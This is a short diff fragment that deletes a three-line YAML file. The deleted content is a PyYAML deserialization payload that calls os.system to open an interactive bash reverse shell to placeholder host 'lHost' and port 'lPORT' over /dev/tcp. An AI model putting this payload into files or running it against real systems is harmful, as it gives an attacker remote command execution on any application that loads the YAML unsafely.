@@ -1,3 +1,0 @@
-!!python/object/new:os.system [
-  'bash -c "bash -i >& /dev/tcp/lHost/lPORT 0>&1"'
-]
